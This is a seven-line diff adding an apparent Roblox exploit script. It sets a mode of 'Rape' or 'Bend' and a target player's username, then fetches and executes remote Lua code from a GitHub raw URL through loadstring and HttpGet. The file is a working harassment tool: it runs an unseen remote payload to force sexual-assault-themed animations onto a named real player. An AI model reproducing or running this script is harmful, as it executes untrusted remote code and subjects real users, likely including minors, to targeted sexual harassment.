@@ -1,0 +1,7 @@
+-- Set the type to either rape or bend.
+-- Set the playername to the user of the target.
+
+local animationType = "TYPE" -- modes: Rape, Bend
+local Target = "PLAYERNAME" -- Not Display, only real username
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/orruunestad/orruunestad/refs/heads/main/SusScript")()
